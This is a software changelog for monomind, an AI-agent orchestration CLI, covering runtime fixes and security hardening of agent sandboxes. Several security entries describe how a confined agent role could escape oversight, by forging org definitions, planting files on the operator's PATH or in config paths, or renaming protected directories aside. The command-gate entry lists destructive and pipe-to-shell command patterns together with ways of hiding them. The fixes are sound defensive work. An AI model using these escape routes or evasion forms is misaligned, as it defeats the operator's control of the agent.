- **`init --only-claude` with another platform flag is an error, and `--skip-claude` no longer suggests adding Claude Code back** ([#525](https://github.com/monoes/monomind/issues/525)). `init --only-claude --codex` quietly wrote Claude Code only; `--only-claude` with `--platforms`/`--platform` naming another platform, `--target <other>`, `--codex`/`--opencode`/`--kimicode` or `--skip-claude` now fails with `--only-claude cannot be combined with …` (`--target claude` and `--platforms claude` are still accepted). After `init --skip-claude`, the "Not written" hint left Claude Code in its `--platforms` list and offered `--all-platforms`; it now names only the other platforms and its suggested command keeps `--skip-claude`.

- **`--runtime hermes` works with hermes 0.19.0** ([#531](https://github.com/monoes/monomind/issues/531)). The runner ran `hermes chat --query-file <file> --oneshot -Q`, and hermes 0.19.0 (the PyPI release) has neither flag, so every turn failed with `unrecognized arguments`. The runner now reads `hermes chat --help` (stdout and stderr) and caches the answer once a probe exits cleanly; a timed-out or failed probe is retried on the next run, and the probe stops when the run is aborted. A build that lists `--query-file` keeps that form, and otherwise the runner runs `hermes chat --query=<prompt> -Q`, which in 0.19.0 answers one query and exits. With 0.19.0 the prompt therefore travels on the command line: other local users can read it in `ps` or `/proc` while the turn runs, and a prompt over 128 KiB fails with a clear error instead of `E2BIG`. A failed turn with nothing on stderr now shows what hermes printed on stdout, where 0.19.0 puts its "isn't configured yet" setup error; that line maps to `auth`, and the rest of stdout is shown but never used to pick the error code.

- **`--runtime pi-rpc` reports a missing API key at once instead of timing out** ([#532](https://github.com/monoes/monomind/issues/532)). Without a key, pi 0.87.1 in `--mode rpc` answers the prompt with `success:false` ("No API key found for openai") and sends nothing else. The runner ignored that reply and waited on its 10-minute silence watchdog. It now fails the turn with `missing API key: set OPENAI_API_KEY for provider openai, or run \`pi\` then /login`, and pi's own message. When a model is set, the runner first asks pi with `pi auth check --model <m> --json` (about 0.3 s): only `not_ready` stops the run before pi starts, as a missing key or, for other reasons, "not logged in or the login expired". pi resolves the provider itself, so an OpenRouter-routed id such as `deepseek/deepseek-chat-v3.1` with only `OPENROUTER_API_KEY` set runs normally. A pi without `auth check`, or a check that fails, skips the pre-check. Any other rejected prompt also fails the turn, and pi's no-key text on stderr when it exits is reported the same way.

  - **`agent exec` reports a missing API key as `error {code:"auth", fatal:true}` on every runtime** (Agent Exec Protocol rev 27). A message saying "missing API key", "no API key found/configured", or hermes's "no inference provider configured" / "no API keys or providers found" was `runner-error`; §3.4's `auth` now also covers a key that was never set. Text a runner attaches but did not write itself (hermes's stdout, cline's final model text) follows a `[output below is not classified]` line and never decides the error code, so a model saying "401" can no longer turn a failure into `auth`.

- **An unknown cost is reported as `null`, not `0`** ([#533](https://github.com/monoes/monomind/issues/533)). A runtime that reports no cost (codex, kimicode, hermes, vercel and the other `reports_cost: false` runtimes) showed `cost_usd: 0` in `agent exec`'s `usage` and `result` events, in `agent test --json` when no tokens were reported, and in org `usage` events, `org report` and `org costs` — the same value as a free turn. Those fields are now `null` when no cost was reported, and totals are the sum of the reported costs or `null` when there are none. When only some usage had a cost, the total is a lower bound and `org report --json` / `org costs --json` add `cost_complete: false`. A `null` cost never counts toward `--budget-usd` or a role's `budget_usd`. The human-readable `org costs`, `org report --by-role`, `org logs --stats`, run-end line and `org status` say `unknown`; the dashboard's run history says `unpriced`. vercel and hermes no longer yield a fake `cost_usd: 0`. Protocol rev 28, capability `agent-exec-cost-null`.

- **`agent models` marks aliases of the same model** ([#534](https://github.com/monoes/monomind/issues/534)). Claude's `default` and `opus` aliases both resolve to the same model, so a caller that tested every listed model ran and paid for it twice. Every entry is still listed, so a lookup by id such as `opus` keeps working; an entry that resolves to the same model as an earlier one now carries `alias_of` with that entry's id (`"alias_of":"default"` on `opus`), and the earlier entry lists all of them in `aliases`. Skip `alias_of` entries to test each model once. The table view shows `(alias of default)`. What each alias resolves to is unchanged. Capability `agent-models-alias-of`.

- **MonoFence no longer installs monofence-ai into your project** ([#519](https://github.com/monoes/monomind/issues/519)). When monofence-ai was missing, the monofence_* MCP tools ran `npm install monofence-ai --no-save` in the current directory, which created or changed `node_modules` in the user's project, and then asked for an MCP server restart. They now use the first-use installer, which puts monofence-ai@1.0.7 (pinned, with a shipped lockfile, `--ignore-scripts`) into `~/.monomind/deps` and loads it from there without a restart. `security defend`, `security redteam` and org role fences load it the same way; they imported it by name, which never saw that directory. A failed install reports the installer's own message, including the command to install by hand, and is not retried in the same session. The installer now also resolves ESM-only packages such as monofence-ai, whose `exports` have only an `import` condition; before, it could not load one even once installed.

- **`design detect <url>` and `design fix <path>` use their positional target** ([#520](https://github.com/monoes/monomind/issues/520)). The `--target` option had a parser default of `.`, which always won over the positional argument, so `monomind design detect https://example.com` scanned the current directory instead (and `design fix ./src` fixed the current directory). The positional target is now used when `-t/--target` is not given; `-t` still works, and with neither the target is still `.`.

### Security

- **codex no longer writes your environment to a world-readable shell snapshot** ([#535](https://github.com/monoes/monomind/issues/535)). codex's `shell_snapshot` feature is on by default in codex 0.156.1, and `codex exec`, which monomind's codex runner uses, creates `$CODEX_HOME/shell_snapshots/`. A snapshot holds the user's shell environment, including every exported API key and token, and is created with the process umask, so 0644 (world-readable) under the usual umask 022. The runner now passes `-c features.shell_snapshot=false -c features.shell_snapshot_v2=false` on every `codex exec`, so no snapshot is written. Before each spawn it also makes `$CODEX_HOME` (default `~/.codex`) and its `sessions/` and `shell_snapshots/` 0700 when you own them, which hides the files inside from other users whatever their own modes. The process umask is not changed, so files the agent writes in the workspace keep their usual modes. Snapshots already on disk (from monomind runs or interactive codex) stay there: delete `~/.codex/shell_snapshots/*.sh` and rotate the keys they contain.

- **Org definitions take effect only when the operator has signed them** ([#502](https://github.com/monoes/monomind/issues/502)). A role whose Bash could write `.monomind/orgs/` (an unsandboxed or full-access role, a runtime whose own file tools are not policy-gated, or the SDK sandbox, which lets Bash create new files there) could add `evil.json` with a `policy.git: push` role plus an `evil/run` file, and `org serve` started it with push credentials. A role could also widen its own org's `policy` for the next reload or run. `access_ack` covered only full-access grants. Now:

  - **`monomind org sign <org>`** (and `--all`) prints everything that decides what the roles may run, reach or be granted (tool provider commands and env names, adapter and provider config, sandbox `allowWrite`/`allowedDomains`, skills, `instructions_file`, precheck commands, federation, fence), names every role that would run unconfined on this machine, shows a diff against the last signed version, and signs it. The signature covers every field of the definition except the goal and each role's `title`, `responsibilities` and `ui`, so each role's whole `policy`, the roles with their runtimes and adapters, `instructions_file`, `skills`/`skill_pool`, `run_config` (including `prechecks`), `schedule`, `runtime`, `fence`, `federation` and `loadouts` are covered; a `__proto__`/`constructor`/`prototype` key is refused. It is an HMAC under the same machine-local key as full-access grants, stored beside that key in `~/.monomind/orgrt-operator/`, which no role can read or write. The key and signature files must be the operator's own, mode 0600 and not symlinks, and a key replaced after a daemon loaded it is refused. It is not stored in the org file, so tracked org files stay unchanged. `sign` refuses inside an org role's or `agent exec`'s process tree; without a TTY and `--yes` it prints the review and signs nothing.

  - **Enforced where a definition takes effect:** `org run`, `org serve`'s runfile poll and schedule (before a scheduled org's `prechecks` run), resume from a checkpoint, and `org reload`. An unsigned or changed definition is refused with "run `monomind org sign <org>` as the operator after reviewing the change". A refused reload changes nothing: the running org keeps its last verified definition and emits a `hot-reload-refused` audit event. Goal and prompt edits need no new signature.

  - **Migration:** existing orgs are unsigned. `org run` on a TTY offers a one-time review and sign; `org serve`, a detached `org run` and every other non-TTY path refuse until the operator runs `monomind org sign <org>`, or `monomind org sign --all` once per checkout (this includes the shipped `release`, `monomind-dev` and `sample-team` orgs). `org create` and `/mastermind:createorg` sign the org they write. `org role set-access` re-signs an org that was signed before its edit.

  - **Roles can no longer write what the operator's own sessions run or trust:** the org root's `.claude/` and `.mcp.json`, `~/.claude.json` (read-only in the bubblewrap mask), both org skill libraries, `~/.monomind` (except the CLI's own state such as `projects/`, browser state and `models/`), the terminal-execution gate, `~/.npm/_npx`, `~/.npmrc`, `~/.local/bin` and more shell startup dirs. They are refused to the file tools, in the SDK sandbox's `denyWrite` and read-only in the bubblewrap mask; the skill libraries and the terminal gate (as disabled) are created before a role starts. A signed `policy.sandbox.allowWrite` entry opens one of them. A role can no longer fill npx's cache; point `npm_config_cache` at `$TMPDIR` if it must. In the mask `~/.monomind` itself is read-only with only those entries bound back, and cline and aider keep an org role's state in its `$TMPDIR`. `mcp stop` signals the pid in `~/.monomind/mcp.pid` only when its command line is a monomind MCP server, and the terminal-execution gate is read from `$MONOMIND_HOME` when set, where it is protected. `doctor -c org-skills` and `org sign` list org skills that come from the project or user library.

  - **`instructions_file` is read only from inside the project**, through every symlink, and never from the operator or dashboard-auth directories, a credential store or a dashboard token. Its content is signed as a digest; the file is read through a descriptor opened with `O_NOFOLLOW` and checked to be the verified inode with no other hard link, and a session reads it only while its content matches the digest verified at org start.

  - **A path a role plants because it did not exist yet is quarantined:** `~/.claude/.config.json` (which Claude Code prefers over `~/.claude.json`) and other `.claude*.json` variants that were not there at monomind's first look (recorded once; a live legacy config the operator already had is left alone), a `.mcp.json` in an org work tree that is untracked or differs from the main checkout's, and every other protected path that was missing when a role session started. That baseline is kept in the operator dir, so a crashed or killed `org run` does not make a plant look pre-existing, and only `monomind org approve-paths <path>…` (a new subcommand, TTY only, never from a role) trusts a path; signing approves nothing. Checks run at every org start, every session start and end, every 2-second `org run` and `org serve` tick, and every `doctor` run. Anything found is moved (never deleted) to `~/.monomind/orgrt-operator/quarantine/<project>/<ts>/`, out of every role's reach, with an audit event and an operator question giving the exact `mv … && monomind org approve-paths …` to restore it. The first look prints what it trusted. `doctor -c org-skills` warns when `.mcp.json` servers are approved by name but `.mcp.json` is missing, untracked or modified.

  - **`org test-loop` runs its fixture orgs in a throwaway directory**, not in the project, and removes their signatures.

  - **Residual:** a role that can read the operator-credential directory can sign, as it can already forge a full-access grant: an active full-access role, or a role that runs with neither the SDK sandbox nor the bubblewrap mask. **Such roles are allowed, by decision:** refusing them would stop orgs that need one (a push-level releaser, codex on macOS, any role on a host without bubblewrap), so signing protects every other role and these run with a warning instead. `org sign` and every org start name each unconfined role and why it runs without an OS sandbox (for example `policy.git push, and no bubblewrap mask`). To confine one, run it on the claude runtime below `policy.git: push` with the sandbox on, or install bubblewrap (Linux).

- **Org roles can no longer overwrite the operator's node, npm, claude or monomind installed under `$HOME`, or plant a file on the operator's `PATH`** ([#527](https://github.com/monoes/monomind/issues/527)). With node from mise, nvm, volta, fnm, asdf or bun, the SDK sandbox's `allowWrite` (which includes `$HOME`) and the bubblewrap mask both let a sandboxed role replace `node`, `npm` or monomind's own code, or drop a `git` into a writable `PATH` directory, which the daemon and the operator's shells then ran outside every sandbox. At every org and role-session start monomind now resolves the real paths of `process.execPath`, the running CLI's package root, every writable directory on `PATH` (and the directory holding a symlink on the way to one, such as fnm's multishells), and `node`/`npm`/`npx`/`claude` on `PATH`, each with its install root, plus the version-manager roots (mise, nvm, volta, fnm, asdf, rustup, pyenv, rbenv, `~/.cargo/bin`, `~/go/bin`, bun's global installs, pnpm's home as a whole), honouring `$XDG_DATA_HOME`/`$XDG_STATE_HOME`/`$XDG_CONFIG_HOME` and each tool's own variable. Also covered: mise's global config dir and trust store, `~/.mise.toml`, `~/.tool-versions`, direnv's allow list and config dir (a role could otherwise write or trust a config that every mise- or direnv-activated operator shell then runs), and toolchain config files (`~/.bunfig.toml`, `~/.cargo/env`, `~/.cargo/config.toml`, `~/.yarnrc.yml`, `~/.default-npm-packages`, pnpm's `rc`, Go's `env`). The list joins the operator-protected paths, so it is refused to the file tools, in the SDK sandbox's `denyWrite`, read-only in the mask and watched for plants; the install dirs a tool in use expects are created empty up front, so the operator's own `pnpm add -g` is never taken for a plant. Every directory above a protected path (`~/.local`, `~/.local/share`, …) is now a mount point in both OS layers, so a role cannot rename it aside and plant a new tree; this also closes that route for `~/.local/bin` and `~/.npm/_npx`. An org root at `$HOME` no longer uncovers `~/.monomind` in the mask, and excludes no `PATH` directory (with a warning). Roles still run node, npm and claude. A role that installs a global tool gets `EROFS`; `npm_config_prefix=$TMPDIR/npm-global` installs it in the role's temp dir. A role's pnpm store moves to `$XDG_DATA_HOME/pnpm-store` (`npm_config_store_dir`) and pnpm no longer self-installs versions in a role (`npm_config_manage_package_manager_versions=false`); bun's cache stays writable.

- **First-use code is pinned by hash, and roles can no longer plant missing config or move a custom `MONOMIND_HOME` aside** ([#526](https://github.com/monoes/monomind/issues/526), follow-ups to the [#518](https://github.com/monoes/monomind/pull/518) review).

  - **Pinned hashes.** The Claude Agent SDK's `sdk.mjs`, each platform's Claude binary, and every `dist/*.js` file of monofence-ai (which has no dependencies) have SHA-256 hashes shipped next to the install lockfiles, taken from the registry tarballs (the procedure is documented beside them). They are hashed once per process before the package is imported, whether the copy is in `~/.monomind/deps` or found up monomind's own module path. Every `query()` then passes the verified bundled binary as `pathToClaudeCodeExecutable`, so the SDK never picks its own (an installed Claude Code that #522 selected is passed as is and not pin-checked), and one `stat` before the query and again before a spawn hook refuses a binary that changed since it was hashed. The first Claude session in a process waits for the hash of the about 300 MB binary (well under a second on a current machine). `sdk.mjs` is imported by path right after its hash, a window of milliseconds that only an unsandboxed process could use (roles cannot write the deps dir). `@puppeteer/browsers` is not pinned (it loads a whole dependency tree); a test fails for any optional dependency that is neither pinned nor listed as unpinned with a reason. A same-user plant passed the ownership and mode checks; now a mismatch refuses to load, names the file and says what to delete. A test keeps the pins in step with the pinned version and lockfile, and checks them against the copy the checkout installed.

  - **Missing config is created before a role starts.** The SDK sandbox drops a `denyWrite` path that does not exist, so a role could create `~/.npmrc`, `~/.config/npm` or a shell rc file. At org and session start, in the operator's HOME and only where the path is absent (nothing is ever overwritten), monomind now creates:
    - `~/.npmrc`, `~/.bashrc`, `~/.profile` as empty files (mode 0600). Empty, each runs or sets nothing: npm merges nothing from it, interactive bash sources nothing, and `~/.profile` is read by sh/dash login shells, and by bash only without `.bash_profile`/`.bash_login`, never by zsh. `~/.profile` is not created when `$SHELL` is zsh or fish: installers such as nvm's append to `~/.profile` when it exists instead of that shell's rc file;
    - `~/.ssh`, `~/.config/git`, `~/.config/gh`, `~/.config/npm` as empty mode-0700 directories (and `~/.config` if missing). Tools read files inside them, not the directories.

    Linux only. On macOS only `~/.config` is created: seatbelt denies a missing path by rule, so the missing entries are passed to it instead (see below). The SDK sandbox then denies them and the mask binds them read-only. Left to the planted-path watch, because an empty one could change behaviour: `~/.bash_profile` and `~/.bash_login` (bash would skip `~/.profile`), `~/.gitconfig` (`git config --global` would stop writing a later `~/.config/git/config`) and the zsh startup files (zsh's new-user setup would not run).

  - **No rename aside through an ancestor.** Every directory above `$MONOMIND_HOME` and `~/.monomind` whose parent a role can write is a mount point in the SDK sandbox and the bubblewrap mask. monomind refuses to load from a deps root reached through a symlink in a directory the user can write.

  - **macOS.** The SDK's seatbelt profile already denies unlinking and creating every ancestor of a denied path, so the rename-aside defence holds there without mount points. Seatbelt rules match paths, so on macOS a `denyWrite` entry that does not exist yet (with an existing parent) is now passed too, and creating it is denied.

## [2.20.0] — 2026-09-29

### Added

- **`agent exec` reports subagents on every runtime, not only claude** ([#387](https://github.com/monoes/monomind/issues/387), capability `agent-exec-subagent-events`, agent-exec protocol rev 24). On any other runtime, a tool call whose `tool_activity` has `kind:"task"` is now followed by a `subagent` `started` event, and its end by `finished` with `status` (`completed`, `failed`, `denied`, or `stopped` on cancel/timeout) and a `summary` of up to 500 characters of its output. `id` and `tool_use_id` are the call's `tool_activity` id. The events are synthesized from `tool_activity`, so they have no `progress` phase and no `usage`. opencode (`task`), cline (`spawn_agent`, `team_*`) and dsh (`subagent`) mark such calls themselves; other runtimes get `task` from the shared tool-name table (`Task`, `Agent`, `spawn_subagent`, `invoke_subagent`, `browser_subagent`, …). claude keeps its SDK-based events and gets no duplicates. New golden fixture `doc/agent-exec-protocol/fixtures/subagent-synth.ndjson`.

- **`agent test --json` takes `--sandbox` and `--env`, and reports `native_sandbox`** ([#474](https://github.com/monoes/monomind/issues/474), agent-exec protocol rev 25, capability `agent-test-sandbox`). `--sandbox read-only|workspace-write|full` and repeatable `--env KEY=V` mean what they mean for `agent exec`, and are checked the same way. The result has a new `native_sandbox` field with the sandbox the vendor CLI really ran with, taken from the turn's `start` event (`null` when the turn never started). A mode the runtime does not have, such as `--sandbox workspace-write` on pi, returns `status: "error"` with `error.code: "unsupported"`. The test turn keeps `scoped` access, and neither flag can loosen the sandbox: an org git level below `push` still caps codex and grok at `workspace-write`. Callers such as mono-agent can now test a runtime inside the sandbox their real turns use.

- **`agent exec --sandbox` has real restricted modes on more runtimes, and `--sandbox-fallback` makes an unsupported mode non-fatal** ([#482](https://github.com/monoes/monomind/issues/482), agent-exec protocol rev 26, capabilities `agent-exec-sandbox-restricted` and `agent-exec-sandbox-fallback`). 2.19.0 offered `read-only`/`workspace-write` only on codex, grok and dsh, and any other mode was a fatal `unsupported`, so a caller sending one `--sandbox` value to every runtime broke claude and copilot chats. New mode `restricted`: the CLI's own approval rules apply and every call they would ask about is refused (a rule set, not a file-system boundary). New per runtime, each checked with a live turn that tried a write and a shell command: copilot `read-only` (`--deny-tool=write --deny-tool=shell`), `workspace-write` (`--allow-tool=write --deny-tool=shell`, edits confined to the cwd and temp dir, no shell) and `restricted`; antigravity `restricted` (no `--dangerously-skip-permissions`); opencode `restricted` (edit/bash/task/external_directory ask, every ask rejected); pi and pi-rpc `read-only`; claude `read-only` and `workspace-write` with `--access scoped` or `read`, enforced by monomind's own tool gate (`native_sandbox: "monomind"`). `--sandbox-fallback fail|strictest|run` (also on `agent test`): `fail` stays the default; `strictest` runs the closest mode at least as strict as the request (else the strictest there is); `run` runs the runtime default. A replaced mode emits a `status` notice, and `start` now carries `sandbox_requested` and `sandbox_applied`. `agent scan --json` entries gain `sandbox_mode_reports`, and the `agent test --json` result gains `sandbox_applied`. Without `--sandbox`, every runtime's argv is unchanged.

### Changed

- **The dashboard no longer starts at every session start unless you opt in** ([#423](https://github.com/monoes/monomind/issues/423)). The SessionStart hook `control-start.cjs` started the Control Room server (:4242) for every initialised project, and the servers stayed resident: one machine had 8, two at 0.7–0.9 GB RSS. The hook now does nothing, and prints nothing, unless `MONOMIND_DASHBOARD_AUTOSTART=1` is set or `.monomind/dashboard.json` has `{"autostart": true}` (written by the new `monomind init --dashboard`); `MONOMIND_DASHBOARD_AUTOSTART=0` turns it off for a project that opted in. A server that is already running is left alone. `monomind ui` starts it by hand and `monomind org run` still starts it unless `MONOMIND_DASHBOARD_AUTOSTART=0`. **Existing projects:** the hook ships with the package helpers, so updating turns auto-start off there too; run `monomind init --dashboard` in a project to keep it. Without a running dashboard the per-prompt Second Brain lookup uses its keyword fallback.

- **`monomind route task` is `monomind pick --agents`, and the routing hooks carry pick's verdict** ([#430](https://github.com/monoes/monomind/issues/430)). `route task` (and bare `monomind route "<task>"`) ranked through the picker but always named an agent: the top of a ranking pick called unconfident (shown as e.g. 72%), or `coder` when nothing matched, while `pick` said "no confident match". It now runs pick and prints exactly its output, text or `--json`; `data.agentId` is set only when pick is confident. `hooks_route`, `hooks_pre-task` and `hooks_explain` return pick's `confident` flag (hooks_route also its `summary`), pre-task names a primary agent only when pick is confident, and explain says when the top is below the bar. The hooks no longer load `.claude/helpers/router.cjs`, which no hook used for selection; the file stays for scripts and doctor. `route semantic` and the route layer (`@monoes/routing`) are marked deprecated in help and docs, not removed.

### Removed

- **Hooks and helpers that ran every session, turn or prompt and did nothing** ([#417](https://github.com/monoes/monomind/issues/417)). `monomind init` no longer registers the SessionStart `auto-memory-hook.mjs import` and Stop `auto-memory-hook.mjs sync` hooks (both only printed "skipped — AutoMemoryBridge removed"), the SubagentStart `hook-handler.cjs status` hook or the Notification `hook-handler.cjs notify` hook (both only printed `[OK] Hook: …`). With no hooks left, it writes no `Stop` or `Notification` event, and the init wizard no longer offers them. The helpers `auto-memory-hook.mjs`, `learning-service.mjs` (nothing called `record()`) and `memory-palace.cjs` (nothing wrote its drawers, so its session-start `wakeUp` injection was always empty) are no longer installed. The UserPromptSubmit `route` hook no longer runs the `[INTELLIGENCE]` lookup, which rewrote `.monomind/data/ranked-context.json` (~870 KB) on every prompt and matched nothing; `intelligence.cjs` drops `getContext()` and `bootstrapFromDb()`. `init upgrade` leaves the old hooks and files of an existing install in place (they stay harmless no-ops); `init --force` removes `auto-memory-hook.mjs` and its settings hooks. `intelligence-outcomes.jsonl` is still written: session-end success detection, `doctor`'s route-outcome correlation and `hooks intelligence train` read it.

### Fixed

- **The six GitHub agents only tell the model to run commands that exist** ([#421](https://github.com/monoes/monomind/issues/421), follow-up to [#453](https://github.com/monoes/monomind/pull/453)). `monoswarm-code-review`, `monoswarm-issue`, `monoswarm-multi-repo`, `monoswarm-pr`, `project-board-sync` and `workflow-automation` still held about 140 invented `monomind github …`, `monomind actions …` and `monomind swarm …` commands per tree, each a failed call. They are rewritten on the `gh` CLI (`gh pr`, `gh issue`, `gh project`, `gh run`, `gh workflow`, `gh cache`, `gh search`, `gh api`) plus the real `monomind analyze diff`, `analyze complexity`, `security scan`/`secrets`, `memory` and `pick` commands, with subagents doing the review and edit work. Sections that only existed to show an invented command (review dashboards, board "smart move" rules, multi-repo message buses, self-healing and predictive-failure actions, the `SwarmAction` library) are gone. The agents keep their purpose and structure, and fix a few broken snippets (`gh issue create --json`, links to renamed agent files). They also act more carefully: PRs are reviewed in a separate worktree (with a trust check before running a fork's code), multi-repo loops work in a fresh temp clone per repository so a failed clone never commits in your checkout, `/swarm` comment commands are only honoured from owners, members and collaborators, branch protection is appended to rather than replaced, and merging, releasing, pushing fixes, enabling auto-merge and closing stale issues all wait for your confirmation. `KNOWN_BAD_CLI_REFS` is empty, so `scripts/lint-tool-refs.mjs` drops the allowlist: any unresolved `monomind <cmd>` in an agent definition now fails the lint.

- **A role's git guard no longer leaks into repositories its own tests create** ([#481](https://github.com/monoes/monomind/issues/481), follow-up to [#298](https://github.com/monoes/monomind/issues/298)). Roles below `policy.git: 'push'` got `core.hooksPath` and `core.excludesFile` as process-wide `GIT_CONFIG_*` entries, so every git call in the process tree saw them, including a test's throwaway repo in `$TMPDIR`: `git add .claude/settings.json` there failed as ignored by the guard's excludes file (`cleanup-after-init-e2e.test.ts`). The guard now writes both settings to a `gitconfig` file in its state dir and exports only `includeIf.gitdir:<common dir>` and `includeIf.gitdir:<common dir>/worktrees/` entries that include it, so they apply in the org's protected repositories and all their linked worktrees and nowhere else. Inside those repositories the guard is unchanged: pushes and, at `read`/`none`, ref updates are still refused. The transport and credential settings (`protocol.file.allow=never`, the reset `credential.helper`, failing askpass/ssh commands) stay process-wide, so a scratch repository still cannot push.

- **`org events --follow`, `org logs --follow` and `org watch` exit when nobody is reading** ([#433](https://github.com/monoes/monomind/issues/433)). An idle follower only ever stopped on SIGINT/SIGTERM, so one orphaned by its parent (or whose reader had closed the pipe) polled a finished run's `bus.jsonl` twice a second forever. The follow loop now stops when the process is re-parented (its parent pid changes), when stdout errors (EPIPE) or closes, and on SIGHUP. It also exits 0 once the followed run has closed: `runtime.json` records the run as stopped or crashed, or the run's `org-stopped` event was seen and `runtime.json` belongs to a newer run; any remaining events are drained first. A live run is followed as before. Each tick now reads only the bytes appended since the last one instead of the whole file.

- **The README no longer says installing runs no download scripts** ([#428](https://github.com/monoes/monomind/issues/428)). The Trust & Security table said "No post-install scripts that download code" and called tree-sitter a native addon. A fresh `npm install monomind@2.18.5` adds 362 packages and 1.3 GB of `node_modules`, and three install scripts download binaries: puppeteer (657 MB of Chrome into `~/.cache/puppeteer`), onnxruntime-node (CUDA libraries from NuGet on Linux x64) and better-sqlite3 (a prebuilt addon). The table now gives those numbers, and `doc/privacy.md` has a new "Install-time downloads" section listing each install script, what it fetches, and the `PUPPETEER_SKIP_DOWNLOAD=1 ONNXRUNTIME_NODE_INSTALL=skip` setting that brings the install down to 981 MB with no Chrome.

- **The mastermind "Paperclip" admin skills say what they actually do** ([#422](https://github.com/monoes/monomind/issues/422)). `mastermind-approval-detail` read `.monomind/orgs/<org>-approvals.json`, which does not exist (the queue is `.monomind/orgs/<org>/approvals.json`), so it stopped with "No approvals file" on every real org. It now lists, shows, approves and denies through `monomind org approvals`, `org approve` and `org deny`, which reach a running org's daemon; the comment, revision and resubmit actions nothing backed are gone. `mastermind-secrets`, `-environments`, `-plugin-manager`, `-invites`, `-invite-landing`, `-join-queue` and `-access` write side files no runtime code reads. Each now says "bookkeeping only — not enforced by the Org Runtime" in its description and at the top of its body, and the claims of effects that never happen (secrets "consumed by agents", environments controlling where agents run, a disabled plugin not loading) are removed. 43 skills said they were "invoked by `mastermind:X`" for slash commands that do not exist; those lines now name only the skill's own `/mastermind-X` entry.

- **`cleanup --force` keeps the helpers a git-tracked settings file still runs** ([#448](https://github.com/monoes/monomind/issues/448)). Cleanup never edits a git-tracked file, so when a team committed `.claude/settings.json` but not `.claude/helpers/`, the #401 fix could not strip the hooks and cleanup deleted the helpers they run: every prompt and tool call then failed. Cleanup now keeps the whole helpers directory those hooks and the statusLine run (listed as "kept: referenced by tracked .claude/settings.json"), and both the preview and `--force` print the dangling commands with the manual edit that completes the uninstall: delete them from the settings file, commit, re-run `cleanup --force`.

- **doctor's Routing Learning check no longer reports accuracy from too little or one-sided data** ([#425](https://github.com/monoes/monomind/issues/425)). It printed "routing accuracy 100%" from 13 outcomes that were all marked successful. It now reports the sample size and the PICK follow rate (how often the agent used matched the recommendation), shows "insufficient data" as info (not pass) below 30 outcomes, and prints no accuracy when every outcome carries the same flag (warn). The `routing-feedback.jsonl` fallback follows the same rules.

- **`monomind init` runs its doctor pass once, after all its writes, and prints only problems** ([#425](https://github.com/monoes/monomind/issues/425)). The embedded doctor ran before init's last writes and printed each check, then its post-fix re-check, so one run said "No .gitignore found" and then "All … gitignored" (and "1 stale" then "match"). `init` now runs it at the end, applies the same fixes silently, prints only the warnings and failures left after them, then a one-line `Health check: N passed, W warning(s), F failed` summary.

- **`monoswarm`, `autopilot` and `agent spawn` say they start nothing** ([#418](https://github.com/monoes/monomind/issues/418)). `monoswarm init` recorded `"status": "running"` with an empty roster and `monoswarm status` showed a hard-coded 5% progress for a swarm with no tasks. The state file now records `"initialized"`, status reads `recorded (no agents started)` and shows progress only from recorded task files (`n/a` when there are none), and `monoswarm start` shows a "Suggested Agent Roster (not started)" instead of an "Agent Deployment Plan". `agent spawn` prints "recorded in the agent store" and that no process was started (pointing at `monomind agent exec`); the `agent_spawn` MCP tool returns `status: "registered"` with the same note. `monoswarm` and `autopilot` are marked deprecated in help, `autopilot status` and the docs; `autopilot status` says when no task source has tasks, since nothing writes `swarm-tasks.json`. Removing both commands is left for a later release.

- **Grep/search `[MONOGRAPH_HINT]`s no longer point at test mocks** ([#447](https://github.com/monoes/monomind/issues/447)). The pre-bash and pre-search hint lookups in `hook-handler.cjs` took the first matching graph row, which was often a test (`grep bridgeStoreEntry` hinted `…/__tests__/hooks-core-commands.test.ts:17`), and since #409 those hints reach the model. Symbol hints now skip test files, using the same test-path heuristic as the monograph node resolver (#441), so a symbol matched only in tests gets no hint; file-name hints rank non-test files first.

- **The Bash destructive-ops gate no longer blocks commands that only mention a dangerous string** ([#427](https://github.com/monoes/monomind/issues/427)). The PreToolUse gate matched the raw command text, so `grep -rn "rm -rf" src/`, `git commit -m "document git push --force risks"`, `echo 'DROP TABLE' > notes.txt` and heredoc documentation were blocked. The patterns now run per command segment (split on `&&`, `||`, `;`, `|`, `&` and newlines outside quotes). Quoted literals that contain whitespace, and heredoc bodies, are masked only in segments whose command is on a short allowlist of commands that do not execute their arguments (`grep`/`egrep`/`fgrep`/`rg`/`ag`/`ack`, `echo`, `printf`, `cat`, `tee`, `head`, `tail`, `wc`, `jq`, `yq`, `touch`, `mkdir`, `ls`, `git commit`/`tag`/`notes`/`log`/`show`/`grep`/`diff`, `gh issue`/`pr`/`api`/`release`), and only when the rest of the pipeline is allowlisted too and, if anything writes a file, the whole command is. Options that run a program (`printf -v`, `rg --pre`, `ack --pager`, `git grep -O`) disqualify a segment. Every other segment is scanned with the quote characters removed and the text kept, so `npm exec -c '…'`, `nodemon --exec "…"` or any unknown runner still blocks. Assignment values (`X="rm -rf ~"; $X`) and quoted words without spaces (`"rm" -rf ~`) are never masked, and the whole raw command is scanned when a quote is unterminated, when there is a command substitution or a `$X` command word, or when a word names a known string executor (`bash -c`, `eval`, `xargs`, `ssh`, interpreters, database clients such as `psql`, git's `-c`/`--exec`/`rebase`/`config`). The monofence-ai layer on Bash now only warns (on stderr, logged to the security audit as `warn`) unless the command also pipes downloaded content into a shell (`curl … | sh`, `bash <(curl …)`, `sh -c "$(curl …)"`), which still blocks.

- **The statusline renders in about 50 ms instead of about 220 ms** ([#429](https://github.com/monoes/monomind/issues/429)). Every render spawned `npm config get prefix` (for the version), git (branch/status, remote, graph freshness, common dir), `sqlite3` (monograph and memory counts) and `curl` (dashboard probe). Those results are now cached per project in `.monomind/cache/statusline.json` (git and the dashboard probe for 5 s, DB-derived counts for 30 s, version, remote and git dir for 10 min), and an expired segment is recomputed by the render that finds it expired, so a warm render only reads files. The rows and segments shown are unchanged. This covers both `.claude/helpers/statusline.cjs` and the script `init` generates, which also drops its whole-output cache in `~/.monomind/statusline-cache.json`: that cache was keyed only by mode, so another project's statusline could show for up to 5 s. The generated script also imports `spawnSync` again, so its memory count shows instead of silently failing.

